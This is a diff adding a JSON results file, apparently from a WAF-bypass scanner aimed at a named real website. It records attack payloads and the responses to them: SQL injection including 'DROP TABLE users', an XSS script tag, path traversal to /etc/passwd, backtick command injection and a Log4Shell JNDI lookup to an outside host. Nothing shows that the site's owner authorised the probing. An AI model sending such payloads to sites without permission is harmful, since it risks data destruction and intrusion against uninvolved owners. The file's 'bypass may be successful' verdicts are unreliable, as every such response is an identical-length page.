@@ -1,0 +1,52 @@
+{
+    "target": "http://shraddhanetralaya.com",
+    "method": "GET",
+    "waf": {
+        "server_header": "cloudflare",
+        "possible_waf": true
+    },
+    "results": [
+        {
+            "payload": "' OR '1'='1",
+            "status_code": 200,
+            "length": 160478,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "'; DROP TABLE users;--",
+            "status_code": 403,
+            "length": 4515,
+            "analysis": "Likely blocked by WAF"
+        },
+        {
+            "payload": "<script>alert('XSS')</script>",
+            "status_code": 403,
+            "length": 4515,
+            "analysis": "Likely blocked by WAF"
+        },
+        {
+            "payload": "../../etc/passwd",
+            "status_code": 200,
+            "length": 160478,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "`ls`",
+            "status_code": 200,
+            "length": 160478,
+            "analysis": "Bypass may be successful"
+        },
+        {
+            "payload": "${jndi:ldap://example.com/a}",
+            "status_code": 403,
+            "length": 4515,
+            "analysis": "Likely blocked by WAF"
+        },
+        {
+            "payload": "%2e%2e%2f",
+            "status_code": 200,
+            "length": 160478,
+            "analysis": "Bypass may be successful"
+        }
+    ]
+}
